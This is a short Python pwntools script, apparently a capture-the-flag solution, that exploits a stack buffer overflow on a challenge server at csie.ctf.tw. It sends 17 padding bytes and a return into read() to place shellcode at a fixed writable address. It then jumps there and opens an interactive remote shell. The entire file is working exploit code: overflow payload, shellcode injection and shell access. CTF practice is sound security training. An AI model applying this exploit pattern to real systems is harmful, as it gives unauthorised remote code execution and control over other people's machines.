#!/usr/bin/env python
from pwn import *
print enhex(asm('xor eax, eax'))

r = remote('csie.ctf.tw', 10130)
pause()
read = 0x080483d0
mode = 0x00000000
place_to_write = 0x0804b000-0x00000100
length = 0x00000100
r.send('A'*17+p32(read)+p32(place_to_write)+p32(mode)+p32(place_to_write)+p32(length)+'\n');#argument 1 2 3
r.send(asm(shellcraft.sh())+'\n')
r.interactive();
